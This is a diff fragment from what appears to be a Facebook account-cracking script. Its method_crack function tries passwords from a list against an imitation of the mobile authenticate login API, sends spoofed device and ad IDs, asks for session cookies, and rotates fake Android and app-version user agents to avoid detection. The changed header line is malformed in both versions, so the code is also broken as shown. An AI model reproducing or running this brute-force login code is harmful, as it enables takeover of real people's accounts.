@@ -104,7 +104,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '["Dalvik/2.1.0"]
+            header={'User-Agent': ["Dalvik/2.1.0"]
 android_version = ["Android 10", "Android 11", "Android 12"]
 device_make = ["Samsung", "Nokia", "Google Pixel", "OnePlus"]
 app_version = ["FBAV/409.0.0.27.106", "FBAV/410.0.0.28.107", "FBAV/411.0.0.29.108"]
